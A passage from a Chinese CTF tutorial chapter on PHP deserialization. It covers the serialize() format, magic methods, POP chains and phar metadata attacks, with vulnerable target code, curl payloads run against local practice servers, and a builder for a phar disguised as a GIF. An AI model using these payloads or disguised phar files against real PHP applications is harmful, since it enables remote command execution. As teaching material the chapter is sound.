---
chapter: Web安全
section: PHP 反序列化
order: 612
tags:
  - CTF
  - Web安全
  - 反序列化
  - PHP
publish: true
---

# W12 PHP 反序列化
## PHP Deserialization

> [!info]- 章节信息
> **所属方向**：Web 安全 ｜ **难度阶段**：L2 核心漏洞期 ｜ **前置要求**：[[11-Web安全版图与Burp|11 章]] · [[W05-命令注入与代码执行|W05]] · [[W06-文件包含|W06]]
> **本章目标**：逐字符读懂 `serialize()` 的输出格式与可见性前缀；建立魔术方法的触发图谱；在自建靶上完成一级、跳板、多级三条 POP 链的构造与打靶；搞清 phar 反序列化的文件结构、触发函数面与版本分界；掌握字符逃逸膨胀、收缩两型的构造算式；认识 `allowed_classes`、session 处理器差异、SoapClient 三个次要入口；最后落到防御写法。

[[11-Web安全版图与Burp#3.8 反序列化：恢复对象的那一行就是执行点|11 章 3.8]]用 Python pickle 演示过反序列化的最小原理：恢复对象时会调用魔术方法，字节流可控就等于调用链可控，pickle 的 `__reduce__` 一行就写清了要执行的调用。PHP 的 `unserialize()` 是同一赛区的另一名主角，11 章 3.8 结尾那句"cookie 里一坨 `O:4:"User":1:`"指的就是它。本章专注 PHP 侧系统展开，pickle 不再重讲。

两条主线提前说清。一是 **POP 链**：PHP 没有 `__reduce__` 那种"反序列化即执行任意调用"的原语——`unserialize()` 本身只创建对象、填属性、调 `__wakeup`，能执行的代码必须来自靶子代码库里已经存在的类和方法，把"入口魔术方法 → 若干跳中转 → 危险函数"串起来的过程就是 POP 链构造。二是 **phar 反序列化**：[[W06-文件包含#4.7 zip:// 与 phar://：包内条目也是文件|W06 4.7]] 预告的伏笔在此正面回收——一次普通的 `file_exists()` 就能触发反序列化，连 include 都不需要。

和 [[W04-SQL注入|W04]]、[[W05-命令注入与代码执行|W05]]、[[W06-文件包含|W06]] 的方法相同：自建靶、curl 手工打、每条 payload 配输出。行为以 PHP 8.5 为准，涉及旧版本行为处单独写清版本背景；第 5 节的 PHP 7.4 对照由 [[01-Linux环境与CTF实验环境搭建|01 章]]的 docker 镜像 `php:7.4-cli` 给出。

> [!note] 本章的实验约定
> 靶机用 [[W02-工具链实战与靶场搭建|W02]] 的 `php -S` 起服务：POP 靶 9200、phar 靶 9201（7.4 容器）、字符逃逸靶 9203、cookie 演示 9204。curl 一律带 `--noproxy '*'`（防止系统代理往响应里塞内容，[[11-Web安全版图与Burp#6. 常见问题|11 章常见问题表]]讲过这个坑），URL 一律用引号包住，查询串里的特殊字符交给 `-G --data-urlencode`：`-G` 把 `--data` 内容百分号编码后接进查询串，免去手写编码。

## 1. 序列化格式：读懂每一字节

### 1.1 类型码与长度声明

`serialize()` 的输出有固定语法：每个值以"一个类型码 + 冒号"开头，字符串和容器都带长度或个数声明。一段脚本把常用类型各序列化一遍：

```php
<?php
// fmt.php —— serialize() 输出逐类对照
echo serialize((object)['user' => 'guest', 'age' => 20]), "\n";
echo serialize(['a', 'b', 'key' => 'c']), "\n";
echo serialize('hello'), "\n";
echo serialize(42), "\n";
echo serialize(-7), "\n";
echo serialize(true), "\n";
echo serialize(null), "\n";
echo serialize(3.14), "\n";
echo serialize('中文'), "\n";
echo '-- 字符串内容原样存放：双引号、反斜杠都不转义 --', "\n";
echo serialize('he said "hi" \ path'), "\n";
echo '-- S 变体：serialize 不产生，unserialize 认识 --', "\n";
var_dump(unserialize('S:5:"\68\65\6c\6c\6f";'));
```

```bash
php fmt.php
```

输出：

```
O:8:"stdClass":2:{s:4:"user";s:5:"guest";s:3:"age";i:20;}
a:3:{i:0;s:1:"a";i:1;s:1:"b";s:3:"key";s:1:"c";}
s:5:"hello";
i:42;
i:-7;
b:1;
N;
d:3.14;
s:6:"中文";
-- 字符串内容原样存放：双引号、反斜杠都不转义 --
s:19:"he said "hi" \ path";
-- S 变体：serialize 不产生，unserialize 认识 --
string(5) "hello"
```

逐类对照：

| 类型码 | 类型 | 写法 | 上例 |
| ---- | ---- | ---- | ---- |
| `O` | 对象 | `O:类名长:"类名":属性数:{属性名;属性值;…}` | `O:8:"stdClass":2:{…}` |
| `a` | 数组 | `a:元素数:{键;值;…}` | `a:3:{i:0;s:1:"a";…}` |
| `s` | 字符串 | `s:字节长:"内容";` | `s:5:"hello";` |
| `i` | 整数 | `i:数值;` | `i:42;`、`i:-7;` |
| `b` | 布尔 | `b:1;` / `b:0;` | `b:1;` |
| `N` | null | `N;` | `N;` |
| `d` | 浮点 | `d:数值;` | `d:3.14;` |
| `S` | 十六进制转义字符串 | `S:字节长:"\HH\HH…";` | `S:5:"\68\65…";` |

四件事从输出里读出来：

- ==长度声明的单位是字节，不是字符==：`中文` 是 6 字节（UTF-8 每个汉字 3 字节），所以是 `s:6`。手工构造 payload 时每个长度都用 `strlen` 核对，按字符数数必错；
- 对象只序列化==属性==，类名之外没有方法——unserialize 时方法由靶子代码里的类定义提供，串里只有类名和属性值。这条决定了第 3 节 POP 链的边界：串里能写什么属性，就能让什么方法被走到；
- `O` 的属性数、`a` 的元素数同样参与解析，声明个数与实际不符的后果在 [[#4. __wakeup 绕过：一段版本史|第 4 节]]展开；
- `S` 变体把每个字节写成 `\HH` 十六进制转义。serialize 自己不产生 `S:`，unserialize 认识它——见到 `S:` 开头的串，说明它出自手工构造或其他生成器。

> [!note] 序列化串是长度驱动的
> `he said "hi" \ path` 里的双引号与反斜杠进了串仍是原样——serialize 对字符串内容==不做任何转义==；unserialize 读到 `s:` 后按声明长度取字节，取满之后才要求 `"` 和 `;` 收尾。==字符串的边界只由长度声明决定，与内容无关==。这条是本章一切手工构造的地基：改 payload 不用考虑内容转义，把长度数字改对就行；第 6 节字符逃逸能够成立，根源也是解析器"只认长度、不认内容"。

### 1.2 可见性前缀：\0*\0 与 \0类名\0

protected 与 private 属性序列化时，属性名前面多出带 NUL 字节的前缀。把 NUL 标出来看：

```php
<?php
// vis.php —— public / protected / private 的序列化形态（NUL 以 \0 字样标出）
class User {
    public    $pub  = 'p1';
    protected $prot = 'p2';
    private   $priv = 'p3';
}
$s = serialize(new User());
echo '标记出 NUL 的序列化串：', "\n";
echo str_replace("\0", '\0', $s), "\n";
echo '字节级（bin2hex）：', "\n";
echo bin2hex($s), "\n";
echo 'URL 编码后：', "\n";
echo rawurlencode($s), "\n";
```

```bash
php vis.php
```

输出：

```
标记出 NUL 的序列化串：
O:4:"User":3:{s:3:"pub";s:2:"p1";s:7:"\0*\0prot";s:2:"p2";s:10:"\0User\0priv";s:2:"p3";}
字节级（bin2hex）：
4f3a343a2255736572223a333a7b733a333a22707562223b733a323a227031223b733a373a22002a0070726f74223b733a323a227032223b733a31303a2200557365720070726976223b733a323a227033223b7d
URL 编码后：
O%3A4%3A%22User%22%3A3%3A%7Bs%3A3%3A%22pub%22%3Bs%3A2%3A%22p1%22%3Bs%3A7%3A%22%00%2A%00prot%22%3Bs%3A2%3A%22p2%22%3Bs%3A10%3A%22%00User%00priv%22%3Bs%3A2%3A%22p3%22%3B%7D
```

三种前缀，NUL 计入属性名的长度声明：

| 可见性 | 属性名的序列化形态 | 长度构成 |
| ---- | ---- | ---- |
| public | 原名 | 名长 |
| protected | `\0*\0` + 名 | 3 + 名长（上例 7） |
| private | `\0类名\0` + 名 | 类名长 + 2 + 名长（上例 10） |

hex 里 `002a00`、`005573657200` 就是两组 NUL。==构造 payload 打 protected/private 属性时，这三个 NUL 必须原样在串里==——漏掉它们，unserialize 按公开属性名处理，值赋不到目标属性上。可靠做法是像本章这样用 PHP 脚本生成 serialize 串、整体 `rawurlencode` 后传输，不手敲字节。

### 1.3 进 cookie 的形态

靶子从 cookie 读序列化数据——11 章 3.8 描述的真实形态：

```php
<?php
// cookie.php —— 从 cookie 读序列化数据的常见靶形
class User {
    public    $pub  = 'p1';
    protected $prot = 'p2';
    private   $priv = 'p3';
}
var_dump(unserialize($_COOKIE['d']));
```

生成 payload 的脚本与打靶：

```php
<?php
// gen_cookie.php —— 生成 URL 编码后的 cookie payload
class User {
    public    $pub  = 'p1';
    protected $prot = 'p2';
    private   $priv = 'p3';
}
echo rawurlencode(serialize(new User())), "\n";
```

```bash
cd cookie
D=$(php gen_cookie.php)
php -S 127.0.0.1:9204
curl -s --noproxy '*' -b "d=$D" 'http://127.0.0.1:9204/cookie.php'
```

输出：

```
object(User)#1 (3) {
  ["pub"]=>
  string(2) "p1"
  ["prot":protected]=>
  string(2) "p2"
  ["priv":"User":private]=>
  string(2) "p3"
}
```

三个属性按声明的可见性原样恢复。两点传输细节：PHP 收到 cookie 后==自动做一次 URL 解码==，`%00` 落回 NUL 字节，1.2 节的前缀完好无损；编码必须用 `rawurlencode` 这类全量编码，串里的 `;`、`&`、空格不编码就会在 cookie 头与查询串里被截断（[[W01-Web安全导论与HTTP深化|W01]] 的报文语法）。

## 2. 魔术方法触发图谱

POP 链的每一跳都是一个魔术方法，先建立"什么操作触发什么方法"的完整图谱。一个综合 demo 类，把本章要用的十个魔术方法各写一份，逐个操作对照触发：

```php
<?php
// magic.php —— 魔术方法触发图谱：一个综合类，逐个操作对照触发
function tag($t) { echo "== $t ==\n"; }
function m($s)   { echo "  [$s]\n"; }

class Probe {
    public  $name   = 'n';
    public  $misc   = 'x';
    private $hidden = 'h';

    public function __construct()               { m('__construct：new 实例化'); }
    public function __destruct()                { m('__destruct：对象销毁'); }
    public function __sleep()                   { m('__sleep：serialize() 之前'); return ['name']; }
    public function __wakeup()                  { m('__wakeup：unserialize() 恢复完成'); }
    public function __toString()                { m('__toString：被当字符串使用'); return 'Probe'; }
    public function __call($n, $a)              { m("__call：实例方法 $n 不存在"); return ''; }
    public static function __callStatic($n, $a) { m("__callStatic：静态方法 $n 不存在"); return ''; }
    public function __get($n)                   { m("__get：读了不可访问属性 $n"); return ''; }
    public function __set($n, $v)               { m("__set：写了不可访问属性 $n=$v"); }
    public function __invoke($x)                { m('__invoke：对象被当函数调用'); return ''; }
}

tag('new Probe()');
$o = new Probe();
tag('$o->nope(1)          （方法不存在）');
$o->nope(1);
tag('Probe::nope(1)       （静态方法不存在）');
Probe::nope(1);
tag('$o->undef（读不存在属性）');
$o->undef;
tag('$o->undef = 2（写不存在属性）');
$o->undef = 2;
tag('$o->hidden（读 private 属性）');
$o->hidden;
tag('$o(1)                （对象当函数调用）');
$o(1);
tag('(string)$o           （转字符串）');
(string)$o;
tag('serialize($o)');
$s = serialize($o);
echo "  $s\n";
tag('unserialize($s)      （注意：没有 __construct）');
$p = unserialize($s);
tag('echo $p');
echo $p, "\n";
tag('脚本结束，对象销毁');
```

```bash
php magic.php
```

输出：

```
== new Probe() ==
  [__construct：new 实例化]
== $o->nope(1)          （方法不存在） ==
  [__call：实例方法 nope 不存在]
== Probe::nope(1)       （静态方法不存在） ==
  [__callStatic：静态方法 nope 不存在]
== $o->undef（读不存在属性） ==
  [__get：读了不可访问属性 undef]
== $o->undef = 2（写不存在属性） ==
  [__set：写了不可访问属性 undef=2]
== $o->hidden（读 private 属性） ==
  [__get：读了不可访问属性 hidden]
== $o(1)                （对象当函数调用） ==
  [__invoke：对象被当函数调用]
== (string)$o           （转字符串） ==
  [__toString：被当字符串使用]
== serialize($o) ==
  [__sleep：serialize() 之前]
  O:5:"Probe":1:{s:4:"name";s:1:"n";}
== unserialize($s)      （注意：没有 __construct） ==
  [__wakeup：unserialize() 恢复完成]
== echo $p ==
  [__toString：被当字符串使用]
Probe
== 脚本结束，对象销毁 ==
  [__destruct：对象销毁]
  [__destruct：对象销毁]
```

整理成触发图谱，"链中的角色"一列是第 3 节的用法预告：

| 魔术方法 | 触发时机 | 链中的角色 |
| ---- | ---- | ---- |
| `__construct` | `new` 实例化 | 与 unserialize 无关：==unserialize 不调用构造器==，属性值直接来自串 |
| `__destruct` | 对象销毁：unset、引用归零、脚本结束 | 最常见的终点——==脚本结束时必然触发==，不依赖靶子的后续代码 |
| `__wakeup` | unserialize 恢复完成后 | 最常见的源头之一：恢复即执行 |
| `__toString` | 对象被当字符串：echo、字符串拼接、`(string)` | 源头或中转：`echo unserialize($d)` 形态靶的入口 |
| `__call` | 调用不可访问（不存在或非 public）的实例方法 | 中转或终点 |
| `__callStatic` | 调用不可访问的静态方法 | 同上，静态侧 |
| `__get` | 读不可访问属性（不存在或不可见） | 中转：一次属性读取接力到下一跳 |
| `__set` | 写不可访问属性 | 中转 |
| `__invoke` | 对象被当函数调用 `$obj()` | 终点：一切"可调用（callable）"参数位都可能是执行点（[[W05-命令注入与代码执行|W05]] 2.2 的回调入口） |
| `__sleep` | `serialize()` 之前 | 少见源头：应用把对象 serialize 进存储时反向利用；返回数组限定哪些属性被序列化（上例只留 `name`） |

`__sleep` 返回数组的限定效果就在输出里：`Probe` 有三个属性，序列化串只剩 `name` 一个。

> [!info]- 其余魔术方法与 __serialize
> `__isset`/`__unset` 对 `isset()`、`unset()` 不可访问属性触发，与 `__get`/`__set` 同族，链里偶尔当中转。`__clone` 在 `clone $obj` 时触发。`__debugInfo` 调试输出时触发。PHP 7.4 起类可定义 `__serialize()`（返回 `属性名 => 值` 数组），定义了它 `serialize()` 就不再走 `__sleep`，输出格式也不同；靶场上以 `__sleep`/`__wakeup` 形态居多。

## 3. POP 链：从读源码到命令执行

### 3.1 原理：面向属性编程

POP（Property-Oriented Programming，面向属性编程）这个名字点明了方法：==不注入代码，只控制属性==。`unserialize()` 恢复对象时，串里写什么属性就是什么值；对象身上的魔术方法再把属性当参数用——==把"属性 → 方法 → 属性 → ……"这条传导路径找出来，就是读源码时要做的事==。

固定三步：

1. **找终点（sink）**：代码库里哪个方法把属性传进了危险函数？`system($this->cmd)`（[[W05-命令注入与代码执行|W05]] 2.1 的执行函数族）、`eval`、`include($this->tpl)`（[[W06-文件包含|W06]]）、`file_get_contents($this->path)` 都算。优先找魔术方法里的，其次找"能被魔术方法调到的普通方法"；
2. **找跳板（gadget）**：从终点反推"什么操作能走到它"。终点在 `__destruct` 里，任何能让对象销毁的操作都通；终点是普通方法，就找哪个魔术方法会调它（对照第 2 节图谱）；
3. **接源头（source）**：靶子怎么处理 `unserialize()` 的返回值？直接丢弃则 `__wakeup`/`__destruct` 是入口；echo 则 `__toString`；当数组用则 `__get`……把跳板一路接到源头，链就通了。

### 3.2 一级直达：终点类直接可用

靶子只有两个类。`Logger` 的析构器把 `$this->cmd` 交给 `system`，是教科书式的终点：

```php
<?php
// index_direct.php —— 直达靶：unserialize 的返回值没有经过任何"字符串化"操作
class Logger {
    public $cmd;
    function __destruct() {
        system($this->cmd);
    }
}
unserialize($_COOKIE['d'] ?? '');
```

`unserialize` 之后代码什么都没做，但对象在脚本结束时销毁，`__destruct` 必然触发——一级链就够。按 1.1、1.2 节的格式手工拼 payload（类名 `Logger` 长 6，`cmd` 是 public 无前缀，`cat flag.txt` 长 12）：

```
O:6:"Logger":1:{s:3:"cmd";s:12:"cat flag.txt";}
```

URL 编码后放进 cookie 打靶（9200 端口起靶）：

```bash
curl -s --noproxy '*' \
  -b 'd=O%3A6%3A%22Logger%22%3A1%3A%7Bs%3A3%3A%22cmd%22%3Bs%3A12%3A%22cat%20flag.txt%22%3B%7D' \
  'http://127.0.0.1:9200/index_direct.php'
```

输出：

```
flag{pop_gu4rd_cha1n}
```

`cat flag.txt` 的输出直接进了响应。==终点是无条件的 `__destruct` 时，一级 payload 直接够用==——这正是 11 章 3.8"恢复对象的那一行就是执行点"的 PHP 版。

### 3.3 跳板：入口受限时串两个类

真实靶子不会把终点类裸露给 unserialize 的顶层：入口类型常被写死，终点方法也常带状态条件。把靶子改成这样：

```php
<?php
// index_guard.php —— 受限入口靶：入口只认 Template 类型，且终点方法带状态条件
class Logger {                        // 类 A：终点，销毁时执行——但要求先被布防
    public $cmd;
    public $armed = false;
    function __destruct() {
        if ($this->armed) {
            system($this->cmd);
        }
    }
}
class Template {                      // 类 B：跳板，__toString 把请求转给 A
    public $logger;
    function __toString() {
        $log = $this->logger;
        $log->armed = true;           // 处理属性：只有走到 __toString 才布防
        $this->logger = null;         // 释放引用：对象此刻销毁，__destruct 提前触发
        return '[' . $log->cmd . ']';
    }
}
$obj = unserialize($_COOKIE['d'] ?? '');
if (!$obj instanceof Template) {      // 入口类型受限
    http_response_code(400);
    exit("bad type\n");
}
echo $obj;                            // echo 触发 __toString
```

两道限制叠加：unserialize 的顶层对象必须 `instanceof Template`（A 类 payload 直接被拒）；终点 `__destruct` 带 `armed` 条件，而 `armed` 只有 `Template::__toString` 会置真。先打一级 payload 看它被挡成什么样，再按"源头 → 终点"串链：

payload 构造脚本：

```php
<?php
// gen_pop.php —— 生成三个 payload：先打原始序列化串，再打 URL 编码后的 cookie 形态
class Logger   { public $cmd; }
class Template { public $logger; }
class Exec     { public $cmd; }
class Middle   { public $helper; }
class View     { public $data; }

$a = new Logger();   $a->cmd = 'cat flag.txt';
echo "== direct ==\n", serialize($a), "\n", rawurlencode(serialize($a)), "\n";

$b = new Template(); $b->logger = $a;
echo "== chain ==\n", serialize($b), "\n", rawurlencode(serialize($b)), "\n";

$e = new Exec();     $e->cmd = 'cat flag.txt';
$m = new Middle();   $m->helper = $e;
$v = new View();     $v->data = $m;
echo "== multi ==\n", serialize($v), "\n", rawurlencode(serialize($v)), "\n";
```

```bash
php gen_pop.php
```

输出：

```
== direct ==
O:6:"Logger":1:{s:3:"cmd";s:12:"cat flag.txt";}
O%3A6%3A%22Logger%22%3A1%3A%7Bs%3A3%3A%22cmd%22%3Bs%3A12%3A%22cat%20flag.txt%22%3B%7D
== chain ==
O:8:"Template":1:{s:6:"logger";O:6:"Logger":1:{s:3:"cmd";s:12:"cat flag.txt";}}
O%3A8%3A%22Template%22%3A1%3A%7Bs%3A6%3A%22logger%22%3BO%3A6%3A%22Logger%22%3A1%3A%7Bs%3A3%3A%22cmd%22%3Bs%3A12%3A%22cat%20flag.txt%22%3B%7D%7D
== multi ==
O:4:"View":1:{s:4:"data";O:6:"Middle":1:{s:6:"helper";O:4:"Exec":1:{s:3:"cmd";s:12:"cat flag.txt";}}}
O%3A4%3A%22View%22%3A1%3A%7Bs%3A4%3A%22data%22%3BO%3A6%3A%22Middle%22%3A1%3A%7Bs%3A6%3A%22helper%22%3BO%3A4%3A%22Exec%22%3A1%3A%7Bs%3A3%3A%22cmd%22%3Bs%A12%3A%22cat%20flag.txt%22%3B%7D%7D%7D
```

chain payload 的嵌套结构读一遍：顶层是 `Template` 对象（过 instanceof 检查），它的 `logger` 属性是嵌套的 `Logger` 对象，`cmd` 在最里层——==序列化串的嵌套就是对象图的嵌套==，用 PHP 生成免得手数长度。

一级 payload 与链 payload 各打一次：

```bash
curl -s --noproxy '*' \
  -b 'd=O%3A6%3A%22Logger%22%3A1%3A%7Bs%3A3%3A%22cmd%22%3Bs%3A12%3A%22cat%20flag.txt%22%3B%7D' \
  'http://127.0.0.1:9200/index_guard.php'
curl -s --noproxy '*' \
  -b 'd=O%3A8%3A%22Template%22%3A1%3A%7Bs%3A6%3A%22logger%22%3BO%3A6%3A%22Logger%22%3A1%3A%7Bs%3A3%3A%22cmd%22%3Bs%3A12%3A%22cat%20flag.txt%22%3B%7D%7D' \
  'http://127.0.0.1:9200/index_guard.php'
```

输出：

```
bad type
```

```
flag{pop_gu4rd_cha1n}
[cat flag.txt]
```

对照读：一级 payload 只得到 `bad type`，`armed=false` 的析构什么都没做；链 payload 的执行顺序是 `echo` → `Template::__toString`（置 `armed=true`）→ 释放引用触发 `Logger::__destruct` → `system` 输出 flag（第一行）→ `__toString` 返回的 `[cat flag.txt]` 被 echo（第二行）。==跳板的两个常见作用都在这条链里：接通受限入口、给终点喂状态==。

### 3.4 多级链：__get 接 __invoke

每一跳的触发操作可以更"日常"。第三个靶把链拉长成三跳：`__toString` → `__get` → `__invoke`：

```php
<?php
// multi.php —— 多级链靶：__toString → __get → __invoke 三跳
class Exec {                          // 终点：对象被当函数调用时触发 __invoke
    public $cmd;
    function __invoke() {
        system($this->cmd);
        return '';
    }
}
class Middle {                        // 中转：读了不可访问属性时触发 __get
    public $helper;
    function __get($name) {
        $fn = $this->helper;
        return $fn();                 // 把 helper 当函数调用 → __invoke
    }
}
class View {                          // 入口：被当字符串使用时触发 __toString
    public $data;
    function __toString() {
        return $this->data->hidden;   // Middle 没有 hidden 属性 → __get
    }
}
echo unserialize($_COOKIE['d'] ?? '');
```

payload 就是 gen_pop.php 输出的 multi 段：顶层 `View`，`data` 是 `Middle`，`helper` 是 `Exec`。传导路径逐跳核对：echo 触发 `View::__toString`；`$this->data->hidden` 中 `hidden` 在 `Middle` 上不存在，落入 `__get`；`__get` 把 `$this->helper` 当函数调用，`Exec` 对象触发 `__invoke`；`system($this->cmd)` 收尾。

```bash
curl -s --noproxy '*' \
  -b 'd=O%3A4%3A%22View%22%3A1%3A%7Bs%3A4%3A%22data%22%3BO%3A6%3A%22Middle%22%3A1%3A%7Bs%3A6%3A%22helper%22%3BO%3A4%3A%22Exec%22%3A1%3A%7Bs%3A3%3A%22cmd%22%3Bs%3A12%3A%22cat%20flag.txt%22%3B%7D%7D%7D' \
  'http://127.0.0.1:9200/multi.php'
```

输出：

```
flag{pop_gu4rd_cha1n}
```

多级链的读法与两跳无异，只是每跳的"触发操作"都换成了第 2 节图谱里更隐蔽的一类：属性读取（`__get`）、函数调用（`__invoke`）。真实框架靶的链常有五六跳、横跨多个文件，==顺着"终点方法要一个属性 → 谁能把这个属性当方法/函数/字符串用 → 那个操作又在哪个魔术方法里"逐层回溯==，比正着凑快得多。

> [!info]- 现成链库与动态属性
> 框架代码库庞大，人工串链费时，社区把常见框架的链做成了 payload 生成器（phpggc，见第 10 节延伸阅读），Laravel、Symfony、Yii 等的链一条命令生成。另有一个版本细节：给对象赋一个类定义里不存在的属性（PHP 8.2 起普通代码里已废弃），unserialize 仍然允许——==payload 伪造"类里没有的属性"照样生效==，但更稳的写法是让伪造属性与真实属性同名（覆盖而非新增），靶子类的校验代码也更可能放过它。

## 4. __wakeup 绕过：一段版本史

`__wakeup` 在 unserialize 恢复完成后立即执行，靶子常在里面做属性校验或重写（比如强制 `$this->role = 'guest'`）。对攻击者，`__wakeup` 是链源头的障碍；老题解里大量出现的"绕过 `__wakeup`"payload，针对的是一个存在了十年的解析缺陷。细节放折叠框：

> [!info]- 属性个数不匹配：CVE-2016-7124
> **写法**：把对象头里的属性数声明得比实际属性多一个——`O:4:"Test":2:{s:1:"a";i:1;}`（声明 2 个、实际给 1 个）。
> **效果**：在受影响的版本上，unserialize 填完实际属性后虽在串尾读不到更多内容，仍把对象创建出来，==`__wakeup` 被跳过==，之后对象销毁时 `__destruct` 照常触发。`__wakeup` 里的校验与属性重写全部落空，攻击者白拿属性控制权。
> **适用版本**：PHP < 5.6.25 且 < 7.0.10（这两个版本修复，CVE-2016-7124）。7.0.10 之后的任何版本上此写法都无效。
> **当代行为**：PHP 8.5 上，声明个数超出实际个数时解析器读完实际属性即断流，`unserialize()` 发出 `Unexpected end of serialized data` 与 `Error at offset` 告警并返回 `false`——`__wakeup` 不执行，对象也拿不到，绕过与正常反序列化一起失效。
> **实战判断**：题解里出现"改大属性数绕 `__wakeup`"，说明靶子在旧版本上，payload 照搬即可；当代靶遇到 `__wakeup` 校验，绕过点在别处（比如让 `__wakeup` 自己把属性改回可利用形态）。

## 5. phar 反序列化：文件操作函数上的入口

[[W06-文件包含#4.7 zip:// 与 phar://：包内条目也是文件|W06 4.7]]讲 `phar://` 协议时留了一句"包里的元数据区存着序列化对象，文件函数碰到 phar 流会把它反序列化——这条线属于反序列化漏洞，后续章节专门讲"。本节兑现这句话：==不经过 include、不经过 unserialize 的调用点，一次 `file_exists()` 就能触发对象恢复==。

### 5.1 phar 文件的三段结构

phar 是 PHP 自己的归档格式，文件分三段：

| 段 | 内容 | 本章关注点 |
| ---- | ---- | ---- |
| stub | PHP 代码，必须含 `__HALT_COMPILER(); ?>`，前面可加任意字节 | 加 `GIF89a` 前缀伪装成图片头 |
| manifest | 归档目录信息 + **序列化的元数据** | 元数据就是反序列化的来源 |
| 内容 | 包内各文件 | 塞一个无害文件占位即可 |

构造脚本（==创建 phar 需要关掉 `phar.readonly`==，它是防写的 ini 开关，只管创建、不管读取）：

```php
<?php
// build_phar.php —— 生成带恶意元数据的 phar（需 -d phar.readonly=0），改名 evil.jpg 即图片马
class Cleaner {
    public $cmd;
    function __destruct() {
        system($this->cmd);
    }
}
$c = new Cleaner();
$c->cmd = 'cat flag.txt';

$p = new Phar(__DIR__ . '/evil.phar');                   // 创建时扩展名必须是 phar 认识的格式
$p->startBuffering();
$p->setStub('GIF89a' . '<?php __HALT_COMPILER(); ?>');   // GIF 头 + stub：图片马形态
$p['readme.txt'] = 'harmless text';
$p->setMetadata($c);                                     // 元数据：序列化后写入 manifest
$p->stopBuffering();
rename(__DIR__ . '/evil.phar', __DIR__ . '/evil.jpg');   // 改名成 .jpg：phar:// 不看扩展名
echo "built: ", __DIR__, "/evil.jpg\n";
```

两处细节都来自报错本身。不关开关直接创建：

```bash
php build_phar.php
```

输出：

```
PHP Fatal error:  Uncaught UnexpectedValueException: creating archive ".../evil.phar" disabled by the php.ini setting phar.readonly in build_phar.php:12
```

`Phar` 构造器还要求归档扩展名是它认识的格式（`.phar`、`.zip`、`.tar` 一族），直接给 `evil.jpg` 会得到 `file extension (or combination) not recognised`——所以脚本先建 `evil.phar` 再改名。正确的构造命令与文件内容检查：

```bash
php -d phar.readonly=0 build_phar.php
head -c 64 evil.jpg | od -A x -t x1z
strings -t d evil.jpg | grep -E 'Cleaner|GIF'
```

输出：

```
built: .../evil.jpg
00000000  47 49 46 38 39 61 3c 3f  70 68 70 20 5f 5f 48 41  >GIF89a<?php __HA<
00000010  4c 54 5f 43 4f 4d 50 49  4c 45 52 28 29 3b 20 3f  >LT_COMPILER(); ?<
00000020  3e 0d 0a 68 00 00 00 01  00 00 00 11 00 00 00 01  >..h.............<
00000030  00 00 00 00 00 30 00 00  00 4f 3a 37 3a 22 43 6c  >.....0...O:7:"Cl<
00000040
      0 GIF89a<?php __HALT_COMPILER(); ?>
     57 O:7:"Cleaner":1:{s:3:"cmd";s:12:"cat flag.txt";}
```

三段结构在字节里一目了然：偏移 0 起是 stub（`GIF89a` + `__HALT_COMPILER`），0x24 起是 manifest 的长度字段群，偏移 57 处躺着元数据——第 1 节逐字符学过的序列化串 `O:7:"Cleaner":1:{…}`。==识别一个文件是不是恶意 phar，`strings` 扫到 `O:` 开头的类型码就是直接证据==。

### 5.2 触发机制与版本分界

机制：`phar://` 流第一次打开归档时要解析 manifest。在 PHP 7.x 及更早版本上，==这次解析会把元数据 `unserialize`==，恢复出的对象随进程结束销毁，`__destruct` 触发。元数据对象的类必须在靶子代码里已定义（否则降级为 `__PHP_Incomplete_Class`，魔术方法一个都不触发——第 3 节"链依赖靶上已有的类"在这里同样成立）。

关键问题随之而来：==哪些文件操作函数会触发==。用探针归档逐函数验证——元数据对象的 `__destruct` 落一个标记文件，函数触发与否看标记：

```php
<?php
// build_probe.php —— 生成探针 phar：元数据对象的 __destruct 落一个标记文件
class Probe {
    public $x;
    function __destruct() {
        file_put_contents('/tmp/w12hit.txt', "hit\n", FILE_APPEND);
    }
}
$p = new Phar(__DIR__ . '/probe.phar');
$p->startBuffering();
$p->setStub('GIF89a<?php __HALT_COMPILER(); ?>');
$p['a.txt'] = 'data';
$p->setMetadata(new Probe());
$p->stopBuffering();
rename(__DIR__ . '/probe.phar', __DIR__ . '/probe.jpg');
echo "built: probe.jpg\n";
```

```php
<?php
// trigger_one.php —— 用法: php trigger_one.php <函数名>
// 对 probe.jpg 执行一种文件操作，元数据对象若被反序列化，进程结束时 __destruct 落标记
class Probe {                        // 靶子代码库里"恰好存在"的类：元数据反序列化的前提
    public $x;
    function __destruct() {
        file_put_contents('/tmp/w12hit.txt', "hit\n", FILE_APPEND);
    }
}
$name = $argv[1] ?? '';
$f = 'phar://' . __DIR__ . '/probe.jpg';
switch ($name) {
    case 'file_exists':       @file_exists($f); break;
    case 'is_dir':            @is_dir($f); break;
    case 'is_file':           @is_file($f); break;
    case 'is_link':           @is_link($f); break;
    case 'is_readable':       @is_readable($f); break;
    case 'filesize':          @filesize($f); break;
    case 'filemtime':         @filemtime($f); break;
    case 'fileperms':         @fileperms($f); break;
    case 'file_get_contents': @file_get_contents($f); break;
    case 'file':              @file($f); break;
    case 'fopen':             $h = @fopen($f, 'r'); if (is_resource($h)) fclose($h); break;
    case 'readfile':          @readfile($f); break;
    case 'stat':              @stat($f); break;
    case 'opendir':           $d = @opendir($f); if (is_resource($d)) closedir($d); break;
    case 'scandir':           @scandir($f); break;
    case 'glob':              @glob($f . '/*'); break;
    case 'md5_file':          @md5_file($f); break;
    case 'hash_file':         @hash_file('md5', $f); break;
    case 'getimagesize':      @getimagesize($f); break;
    case 'copy':              @copy($f, '/tmp/w12copy.bin'); break;
    case 'unlink':            @unlink($f); break;
    case 'touch':             @touch($f); break;
    default:                  fwrite(STDERR, "unknown func\n"); exit(1);
}
```

```bash
#!/bin/bash
# trigger_loop.sh —— 逐函数验证 phar 元数据反序列化触发面
cd "$(dirname "$0")"
for fn in file_exists is_dir is_file is_link is_readable filesize filemtime fileperms \
          file_get_contents file fopen readfile stat opendir scandir glob \
          md5_file hash_file getimagesize copy unlink touch; do
    rm -f /tmp/w12hit.txt /tmp/w12copy.bin
    php trigger_one.php "$fn" >/dev/null 2>&1
    if [ -f /tmp/w12hit.txt ]; then
        echo "$fn: TRIGGER"
    else
        echo "$fn: no"
    fi
done
```

PHP 7.4 与 PHP 8.5 各跑一遍（7.4 侧用容器，`bash trigger_loop.sh` 在容器内执行）：

```bash
docker run --rm -v "$PWD":/lab -w /lab php:7.4-cli bash /lab/trigger_loop.sh
bash trigger_loop.sh
```

输出（PHP 7.4.33）：

```
file_exists: TRIGGER
is_dir: TRIGGER
